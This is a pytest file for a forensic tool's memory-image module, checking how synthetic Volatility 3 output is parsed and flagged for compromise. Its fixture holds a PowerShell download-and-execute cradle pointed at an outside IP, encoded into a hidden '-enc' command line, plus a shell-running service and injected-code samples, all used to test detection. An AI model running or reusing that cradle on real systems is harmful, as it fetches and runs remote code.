"""Memory images: Volatility 3's output (made here by Volatility's own TreeGrid and JSON renderer, so it has exactly the
shape `vol -r json` writes) turned into records, what stands out, the module end to end against recorded plugin output,
the command line DFIP runs, why an image cannot be read, symbol packs, and recognising memory images at upload."""
import base64
import contextlib
import datetime as dt
import io
import json
import os
import tempfile
import zipfile
from pathlib import Path

import pytest

os.environ.setdefault('XDG_CACHE_HOME', tempfile.mkdtemp(prefix='vol-cache-'))  # Volatility makes its cache folder on import

from volatility3.cli.text_renderer import JsonRenderer  # noqa: E402
from volatility3.framework import renderers  # noqa: E402
from volatility3.framework.renderers import format_hints  # noqa: E402

from app.core.config import settings  # noqa: E402
from app.forensic import memory as mem  # noqa: E402
from app.forensic import volatility as vol  # noqa: E402

UTC = dt.timezone.utc
T0 = dt.datetime(2026, 9, 1, 8, 58, 1, tzinfo=UTC)
Hex = format_hints.Hex
NA = renderers.UnreadableValue


def vol_json(columns, nodes) -> str:
    """A plugin's output as Volatility writes it with `-r json`: columns [(name, type)], nodes [(depth, values)]."""
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        JsonRenderer().render(renderers.TreeGrid(columns, iter(nodes)))
    return buf.getvalue()


INFO = [('Variable', str), ('Value', str)]
PSTREE = [('PID', int), ('PPID', int), ('ImageFileName', str), ('Offset(V)', Hex), ('Threads', int), ('Handles', int), ('SessionId', int),
          ('Wow64', bool), ('CreateTime', dt.datetime), ('ExitTime', dt.datetime), ('Audit', str), ('Cmd', str), ('Path', str)]
CMDLINE = [('PID', int), ('Process', str), ('Args', str)]
NETSCAN = [('Offset', Hex), ('Proto', str), ('LocalAddr', str), ('LocalPort', int), ('ForeignAddr', str), ('ForeignPort', int), ('State', str),
           ('PID', int), ('Owner', str), ('Created', dt.datetime)]
MALFIND = [('PID', int), ('Process', str), ('Start VPN', Hex), ('End VPN', Hex), ('Tag', str), ('Protection', str), ('CommitCharge', int),
           ('PrivateMemory', int), ('File output', str), ('Notes', str), ('Hexdump', str), ('Disasm', str)]
SVCSCAN = [('Offset', Hex), ('Order', int), ('PID', int), ('Start', str), ('State', str), ('Type', str), ('Name', str), ('Display', str),
           ('Binary', str), ('Binary (Registry)', str), ('Dll', str)]
DLLLIST = [('PID', int), ('Process', str), ('Base', Hex), ('Size', Hex), ('Name', str), ('Path', str), ('LoadCount', int), ('LoadTime', dt.datetime),
           ('File output', str)]
PAYLOAD = 'IEX (New-Object Net.WebClient).DownloadString("http://93.184.216.34/a")'
ENC = base64.b64encode(PAYLOAD.encode('utf-16-le')).decode()
SYS32 = 'C:\\Windows\\System32\\'


def proc(depth, pid, ppid, name, minute, path=None, cmd=None, exited=None):
    k = 0xffffc00000000000 + pid * 0x100
    return (depth, (pid, ppid, name, Hex(k), 8, 200, 1, False, T0 + dt.timedelta(minutes=minute), exited or NA(),
                    f'\\Device\\HarddiskVolume3{path[2:]}' if path else NA(), cmd or NA(), path or NA()))


def recorded() -> dict:
    """What each plugin printed for a Windows 10 laptop with a payload: plugin name: JSON text."""
    info = vol_json(INFO, [(0, (k, v)) for k, v in (
        ('Kernel Base', '0xf80772000000'), ('DTB', '0x1ad000'), ('Symbols', 'file:///app/storage/volatility/symbols/windows.zip!windows/ntkrnlmp.pdb/X.json.xz'),
        ('Is64Bit', 'True'), ('IsPAE', 'False'), ('layer_name', '0 WindowsIntel32e'), ('memory_layer', '1 FileLayer'), ('Major/Minor', '15.19041'),
        ('MachineType', '34404'), ('KeNumberProcessors', '4'), ('SystemTime', '2026-09-01 14:30:12+00:00'), ('NtSystemRoot', 'C:\\Windows'),
        ('NtProductType', 'NtProductWinNt'), ('NtMajorVersion', '10'), ('NtMinorVersion', '0'))])
    tree = [proc(0, 4, 0, 'System', 0), proc(1, 400, 4, 'smss.exe', 0, SYS32 + 'smss.exe'),
            proc(0, 500, 388, 'wininit.exe', 1, SYS32 + 'wininit.exe'),
            proc(1, 600, 500, 'services.exe', 1, SYS32 + 'services.exe'),
            proc(2, 700, 600, 'svchost.exe', 1, SYS32 + 'svchost.exe', SYS32 + 'svchost.exe -k netsvcs -p'),
            proc(2, 710, 600, 'MsMpEng.exe', 2, 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24\\MsMpEng.exe'),
            proc(1, 650, 500, 'lsass.exe', 1, SYS32 + 'lsass.exe'),
            proc(0, 1500, 1480, 'explorer.exe', 5, 'C:\\Windows\\explorer.exe'),
            proc(1, 2000, 1500, 'WINWORD.EXE', 300, 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'),
            proc(2, 2100, 2000, 'powershell.exe', 301, SYS32 + 'WindowsPowerShell\\v1.0\\powershell.exe', f'powershell.exe -nop -w hidden -enc {ENC}'),
            proc(1, 2200, 1500, 'svchost.exe', 302, 'C:\\Users\\alice\\AppData\\Local\\Temp\\svchost.exe'),
            proc(1, 2300, 1500, 'scvhost.exe', 303, 'C:\\Windows\\scvhost.exe'),
            proc(1, 2400, 1500, 'lsass.exe', 304, SYS32 + 'lsass.exe'),
            proc(1, 2500, 1500, 'notepad.exe', 305, SYS32 + 'notepad.exe'),
            proc(1, 2600, 1500, 'OneDrive.exe', 6, 'C:\\Users\\alice\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe'),
            proc(1, 2700, 1500, 'RuntimeBroker.e', 7, SYS32 + 'RuntimeBroker.exe'),
            proc(1, 2800, 1500, 'taskhost.exe', 8, SYS32 + 'taskhost.exe'),
            proc(1, 2900, 1500, 'chrome.exe', 9, 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', exited=T0 + dt.timedelta(minutes=60))]
    cmdline = vol_json(CMDLINE, [(0, (2500, 'notepad.exe', '"C:\\Windows\\system32\\notepad.exe" C:\\Users\\alice\\notes.txt')),
                                 (0, (2900, 'chrome.exe', NA()))])
    net = vol_json(NETSCAN, [
        (0, (Hex(0xffffd00000001000), 'TCPv4', '192.168.1.20', 49712, '93.184.216.34', 443, 'ESTABLISHED', 2100, 'powershell.exe', T0 + dt.timedelta(minutes=302))),
        (0, (Hex(0xffffd00000002000), 'TCPv4', '192.168.1.20', 49713, '1.1.1.1', 80, 'CLOSE_WAIT', 2500, 'notepad.exe', T0 + dt.timedelta(minutes=306))),
        (0, (Hex(0xffffd00000003000), 'TCPv4', '192.168.1.20', 49714, '142.250.80.46', 443, 'ESTABLISHED', 2600, 'OneDrive.exe', T0 + dt.timedelta(minutes=7))),
        (0, (Hex(0xffffd00000004000), 'UDPv4', '0.0.0.0', 5353, '*', 0, NA(), 700, 'svchost.exe', T0)),
        (0, (Hex(0xffffd00000005000), 'TCPv4', '192.168.1.20', 445, '192.168.1.5', 50111, 'ESTABLISHED', 4, 'System', T0))])
    mal = vol_json(MALFIND, [
        (0, (2100, 'powershell.exe', Hex(0x1f0000), Hex(0x1fffff), 'VadS', 'PAGE_EXECUTE_READWRITE', 16, 1, 'Disabled', NA(),
             '4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00', '"0x1f0000:\\tdec\\tebp\\n0x1f0001:\\tpop\\tedx"')),
        (0, (1500, 'explorer.exe', Hex(0x7ff6000), Hex(0x7ff6fff), 'VadS', 'PAGE_EXECUTE_READWRITE', 1, 1, 'Disabled', NA(),
             'fc 48 83 e4 f0 e8 c0 00 00 00', '"0x7ff6000:\\tcld"'))])
    svc = vol_json(SVCSCAN, [
        (0, (Hex(0x1000), 1, 1234, 'SERVICE_AUTO_START', 'SERVICE_RUNNING', 'SERVICE_WIN32_OWN_PROCESS', 'Spooler', 'Print Spooler',
             SYS32 + 'spoolsv.exe', SYS32 + 'spoolsv.exe', NA())),
        (0, (Hex(0x2000), 2, NA(), 'SERVICE_AUTO_START', 'SERVICE_STOPPED', 'SERVICE_WIN32_OWN_PROCESS', 'updater', 'Updater',
             NA(), 'C:\\Users\\Public\\updater.exe', NA())),
        (0, (Hex(0x3000), 3, NA(), 'SERVICE_DEMAND_START', 'SERVICE_STOPPED', 'SERVICE_WIN32_OWN_PROCESS', 'shellsvc', 'Shell',
             'cmd.exe /c C:\\Windows\\Temp\\x.bat', NA(), NA()))])
    dll = vol_json(DLLLIST, [
        (0, (2100, 'powershell.exe', Hex(0x7ffa10000000), Hex(0x1f000), 'ntdll.dll', SYS32 + 'ntdll.dll', 65535, T0, 'Disabled')),
        (0, (2100, 'powershell.exe', Hex(0x180000000), Hex(0x5000), 'evil.dll', 'C:\\Users\\alice\\AppData\\Local\\Temp\\evil.dll', 1,
             T0 + dt.timedelta(minutes=301), 'Disabled'))])
    return {'windows.info': info, 'windows.pstree': vol_json(PSTREE, tree), 'windows.cmdline': cmdline, 'windows.netscan': net,
            'windows.malware.malfind': mal, 'windows.svcscan': svc, 'windows.dlllist': dll}


def test_windows_info():
    i = mem.info(json.loads(recorded()['windows.info']))
    assert (i['windows'], i['build'], i['version'], i['architecture'], i['processors']) == ('Windows 10', 19041, '10.0', 'x64', 4)
    assert i['system_time'] == dt.datetime(2026, 9, 1, 14, 30, 12, tzinfo=UTC) and i['kernel_base'] == '0xf80772000000' and i['system_root'] == 'C:\\Windows'
    assert mem.windows_name(10, 0, 22631, False) == 'Windows 11' and mem.windows_name(10, 0, 20348, True) == 'Windows Server 2022'
    assert mem.windows_name(6, 1, 7601, False) == 'Windows 7' and mem.windows_name(6, 1, 7601, True) == 'Windows Server 2008 R2'


def _parsed():
    out = {k: json.loads(v) for k, v in recorded().items()}
    procs = mem.processes(out['windows.pstree'], out['windows.cmdline'])
    conns = mem.connections(out['windows.netscan'])
    inj = mem.injections(out['windows.malware.malfind'])
    svcs = mem.services(out['windows.svcscan'])
    mem.assess(procs, conns, inj, svcs)
    dlls = mem.dlls(out['windows.dlllist'])
    mem.assess_dlls(dlls, procs)
    return procs, conns, inj, svcs, dlls


def test_processes_and_what_stands_out():
    procs, conns, inj, svcs, dlls = _parsed()
    by = {p['pid']: p for p in procs}
    codes = {pid: {f['code'] for f in p['flags']} for pid, p in by.items()}
    assert len(procs) == 18 and by[700]['depth'] == 2 and by[700]['parent_name'] == 'services.exe'
    assert by[4]['offset'] == '0xffffc00000000400'  # kernel addresses stay exact, as text
    assert by[2500]['cmdline'].endswith('notes.txt') and by[2900]['cmdline'] is None and by[2900]['exited'] == T0 + dt.timedelta(minutes=60)
    # The normal ones: nothing (the Defender and OneDrive folders, a truncated name, Windows 7's task host, a browser).
    for pid in (4, 400, 500, 600, 700, 710, 2000, 2600, 2700, 2800, 2900):
        assert not by[pid]['notable'], (pid, by[pid]['flags'])
    assert {'ENCODED_POWERSHELL', 'DOCUMENT_STARTED_SHELL', 'INJECTED_CODE'} <= codes[2100] and by[2100]['decoded_command'] == PAYLOAD
    assert {'WRONG_PARENT', 'SYSTEM_NAME_WRONG_FOLDER', 'USER_FOLDER'} <= codes[2200]
    assert codes[2300] == {'LOOKALIKE_NAME'} and by[2300]['flags'][0]['label'] == 'Named like svchost.exe'
    assert {'SECOND_INSTANCE', 'WRONG_PARENT'} <= codes[2400] and 'SECOND_INSTANCE' in codes[650]
    assert 'UNUSUAL_CONNECTION' in codes[2500] and 'DLL_FROM_USER_FOLDER' in codes[2100]
    assert mem.notable_pids(procs)[0] == 2100 and set(mem.notable_pids(procs)) == {2100, 2200, 2300, 2400, 650, 2500, 1500}
    c = {x['local_port']: x for x in conns}
    assert c[49712]['external'] and {'PROCESS_STANDS_OUT'} <= {f['code'] for f in c[49712]['flags']} and c[49712]['notable']
    assert {f['code'] for f in c[49713]['flags']} == {'UNUSUAL_PROGRAM'} and not c[49714]['notable'] and not c[445]['external']
    assert c[5353]['foreign_addr'] == '*' and c[5353]['state'] is None
    assert inj[0]['mz'] and inj[0]['start'] == '0x1f0000' and inj[0]['size'] == 0x10000 and {f['code'] for f in inj[0]['flags']} == {
        'MZ_HEADER', 'WRITABLE_AND_EXECUTABLE'} and not inj[1]['mz'] and inj[1]['disasm'].startswith('0x7ff6000')
    s = {x['name']: x for x in svcs}
    assert not s['Spooler']['flags'] and s['Spooler']['process'] is None and s['updater']['notable'] and s['updater']['binary'] is None
    assert {f['code'] for f in s['shellsvc']['flags']} == {'RUNS_A_SHELL'}
    assert [d['name'] for d in dlls if d['notable']] == ['evil.dll'] and dlls[1]['base'] == '0x180000000'


def test_lookalike_names():
    assert mem.lookalike('svch0st.exe') == 'svchost.exe' and mem.lookalike('lsas.exe') == 'lsass.exe' and mem.lookalike('csrrs.exe') == 'csrss.exe'
    assert mem.lookalike('svchost.exe') is None and mem.lookalike('taskhost.exe') is None and mem.lookalike('chrome.exe') is None
    assert mem.decode_powershell('cmd.exe /c echo -enc QQBBAA==') is None and mem.decode_powershell(f'pwsh -EncodedCommand {ENC}') == PAYLOAD


class FakeContext:
    """Records what the module writes; answers each plugin with the recorded output (or a failure)."""

    def __init__(self, tmp: Path, outputs: dict[str, tuple[str, str]]):
        self.work, self.image = tmp / 'work', tmp / 'laptop.mem'
        self.image.write_bytes(b'\0' * 64)
        self.evidence = {'evidence_id': 'EVID-009', 'case_id': 'CASE-1', 'filename': 'laptop.mem', 'memory': {'container': 'Raw capture'}}
        self.case_id, self.eid = 'CASE-1', 'EVID-009'
        self.outputs, self.calls, self.docs, self.counts, self.warnings, self.facts = outputs, [], {}, {}, [], {}

    def run_tool(self, argv, *, timeout, stdout_path=None, memory_bytes=None, env=None, **kw):
        plugin = argv[argv.index('-f') + 2]
        self.calls.append((argv, env))
        status, text = self.outputs.get(plugin, ('FAILED', ''))
        stdout_path.write_text(text, encoding='utf-8')
        return {'status': status, 'returncode': 0 if status == 'COMPLETED' else 1, 'stdout': '', 'stderr': 'Volatility 3 Framework 2.28.0'}

    def count(self, k, n=1):
        self.counts[k] = self.counts.get(k, 0) + n

    def insert(self, col, docs):
        self.docs.setdefault(col, []).extend(docs)

    def set_fact(self, k, v):
        self.facts[k] = v

    def warn(self, w):
        self.warnings.append(w)

    def progress(self, *a):
        pass

    def checkpoint(self):
        pass


@pytest.fixture
def storage(tmp_path, monkeypatch):
    monkeypatch.setattr(settings, 'storage_path', str(tmp_path / 'storage'))
    monkeypatch.setattr(settings, 'memory_symbols_path', '')
    monkeypatch.setattr(settings, 'memory_symbol_server', False)
    return tmp_path


def test_module_end_to_end(storage):
    from app.forensic.modules.memory import MemoryModule
    outputs = {k: ('COMPLETED', v) for k, v in recorded().items()}
    outputs['windows.svcscan'] = ('FAILED', '\nUnsatisfied requirement plugins.SvcScan.kernel.layer_name: \n')
    ctx = FakeContext(storage, outputs)
    MemoryModule().run(ctx)
    plugins = [a[a.index('-f') + 2] for a, _ in ctx.calls]
    assert plugins == ['windows.info', 'windows.pstree', 'windows.cmdline', 'windows.netscan', 'windows.malware.malfind', 'windows.svcscan',
                       'windows.dlllist']
    dll_args = ctx.calls[-1][0]
    assert dll_args[dll_args.index('--pid') + 1] == '2100' and all('--offline' in a and env['XDG_CACHE_HOME'] for a, env in ctx.calls)
    docs = ctx.docs['forensic_artifacts']
    types = [d['type'] for d in docs]
    assert types.count('MEMORY_INFO') == 1 and types.count('MEMORY_PROCESS') == 18 and types.count('MEMORY_CONNECTION') == 5
    assert types.count('MEMORY_INJECTION') == 2 and types.count('MEMORY_SERVICE') == 0 and types.count('MEMORY_DLL') == 2
    ind = [d for d in docs if d['type'] == 'MALWARE_INDICATOR']
    assert len(ind) == 2 and ind[0]['engine'] == 'Volatility malfind' and 'program header (MZ)' in ind[0]['description'] and ind[0]['region'] == '0x1f0000-0x1fffff'
    info = docs[0]
    assert info['windows'] == 'Windows 10' and info['processes'] == 18 and info['processes_notable'] == 7 and info['container'] == 'Raw capture'
    assert len({d['nk'] for d in docs}) == len(docs) and all(d['case_id'] == 'CASE-1' and d['evidence_id'] == 'EVID-009' for d in docs)
    assert any('windows.svcscan: Volatility could not list this' in w for w in ctx.warnings)
    events = ctx.docs['timeline_events']
    kinds = [e['type'] for e in events]
    assert kinds.count('MEMORY_CAPTURED') == 1 and kinds.count('MEMORY_PROCESS_STARTED') == 18 and kinds.count('MEMORY_PROCESS_EXITED') == 1
    assert kinds.count('MEMORY_CONNECTION') == 4  # the listener has no remote end
    ps = next(e for e in events if e['type'] == 'MEMORY_PROCESS_STARTED' and e['pid'] == 2100)
    assert ps['notable'] and 'started by WINWORD.EXE' in ps['description'] and ps['timestamp'] == T0 + dt.timedelta(minutes=301)
    assert ctx.counts['memory_processes'] == 18 and ctx.counts['memory_injections'] == 2 and ctx.facts['memory']['build'] == 19041
    # Everything stored can go into MongoDB: no integer past 64 bits.
    import bson
    bson.encode({'docs': docs, 'events': events})


def test_images_that_cannot_be_read(storage):
    from app.forensic.modules.memory import MemoryModule
    no_kernel = ('\nUnsatisfied requirement plugins.Info.kernel.layer_name: \nUnsatisfied requirement plugins.Info.kernel.symbol_table_name: \n'
                 '\nA translation layer requirement was not fulfilled.')
    no_symbols = '\nUnsatisfied requirement plugins.Info.kernel.symbol_table_name: \n'
    with pytest.raises(ValueError, match='no Windows kernel was found in it'):
        MemoryModule().run(FakeContext(storage, {'windows.info': ('FAILED', no_kernel), 'banners.Banners': ('COMPLETED', '\n[]\n')}))
    linux = json.dumps([{'Offset': 1, 'Banner': 'Linux version 5.15.0-91-generic (buildd@lcy02) (gcc 11.4.0) #101-Ubuntu SMP', '__children': []}])
    with pytest.raises(ValueError, match=r'This is a Linux memory image \(Linux version 5\.15\.0-91-generic'):
        MemoryModule().run(FakeContext(storage, {'windows.info': ('FAILED', no_kernel), 'banners.Banners': ('COMPLETED', linux)}))
    with pytest.raises(ValueError, match='found the Windows kernel in this memory image, but not its symbols'):
        MemoryModule().run(FakeContext(storage, {'windows.info': ('FAILED', no_symbols)}))
    assert mem.failure(no_kernel, '') == 'no Windows kernel was found in it' and mem.failure('', 'Killed') == 'Killed'


def test_volatility_command(storage, monkeypatch):
    a = vol.argv(Path('/x/m.mem'), 'windows.pstree')
    assert a[:4] == ['vol', '-q', '-r', 'json'] and '--offline' in a and a[-3:] == ['-f', '/x/m.mem', 'windows.pstree']
    assert a[a.index('-s') + 1] == str(storage / 'storage' / 'volatility' / 'symbols') and vol.env()['XDG_CACHE_HOME'].endswith('cache')
    monkeypatch.setattr(settings, 'memory_symbol_server', True)
    assert '--offline' not in vol.argv(Path('/x/m.mem'), 'windows.info')


def test_symbol_packs(storage):
    good = storage / 'windows.zip'
    with zipfile.ZipFile(good, 'w') as z:
        z.writestr('windows/', '')
        z.writestr('windows/ntkrnlmp.pdb/1A2B3C-1.json.xz', b'\xfd7zXZ' + b'0' * 50)
        z.writestr('windows/ntkrnlmp.pdb/4D5E6F-1.json.xz', b'\xfd7zXZ' + b'0' * 50)
        z.writestr('linux/Ubuntu_5.15.0-91.json.xz', b'x')
    assert vol.check_pack(good)['symbols'] == {'windows': 2, 'linux': 1, 'mac': 0}
    for bad, member in (('other.zip', 'windows/readme.txt'), ('climb.zip', 'windows/../../etc/x.json'), ('top.zip', 'x.json.xz')):
        with zipfile.ZipFile(storage / bad, 'w') as z:
            z.writestr(member, 'x')
        with pytest.raises(ValueError):
            vol.check_pack(storage / bad)
    (storage / 'plain.zip').write_bytes(b'not a zip')
    with pytest.raises(ValueError, match='ZIP'):
        vol.check_pack(storage / 'plain.zip')
    dest = vol.symbols_dir() / 'windows.zip'
    dest.write_bytes(good.read_bytes())
    info = vol.record_pack('windows.zip', dest, 'upload', 'Ann')
    listed = vol.packs()
    assert listed[0]['name'] == 'windows.zip' and listed[0]['sha256'] == info['sha256'] and listed[0]['symbols']['windows'] == 2
    vol.forget_pack('windows.zip')
    assert vol.packs()[0]['sha256'] is None


def test_memory_images_are_recognised(tmp_path):
    from app.forensic.disk_formats import MEMORY, PCAP, SetError, classify, detect, extension_ok, memory_container
    (tmp_path / 'a.dmp').write_bytes(b'PAGEDU64' + b'\0' * 600)
    (tmp_path / 'b.lime').write_bytes(b'EMiL\x01\0\0\0' + b'\0' * 600)
    (tmp_path / 'c.mem').write_bytes(b'\0' * 600)
    (tmp_path / 'd.vmem').write_bytes(b'\x01' * 600)
    (tmp_path / 'e.bin').write_bytes(b'PAGEDUMP' + b'\0' * 600)
    for name, label in (('a.dmp', 'Windows crash dump (64-bit)'), ('b.lime', 'LiME capture'), ('c.mem', 'Raw capture'), ('e.bin', 'Windows crash dump (32-bit)')):
        assert detect(tmp_path / name) == MEMORY and memory_container(tmp_path / name) == label
    assert detect(tmp_path / 'd.vmem') == MEMORY and classify([tmp_path / 'c.mem'])['format'] == MEMORY
    assert extension_ok('x.mem') and extension_ok('x.vmem') and extension_ok('x.lime') and extension_ok('x.dmp') and not extension_ok('x.hiberfil')
    (tmp_path / 'f.dmp').write_bytes(b'MDMP' + b'\0' * 600)
    with pytest.raises(SetError, match='minidump'):
        classify([tmp_path / 'f.dmp'])
    with pytest.raises(SetError, match='on its own'):
        classify([tmp_path / 'c.mem', tmp_path / 'a.dmp'])
    (tmp_path / 'g.pcap').write_bytes(b'\xd4\xc3\xb2\xa1' + b'\0' * 600)
    assert detect(tmp_path / 'g.pcap') == PCAP
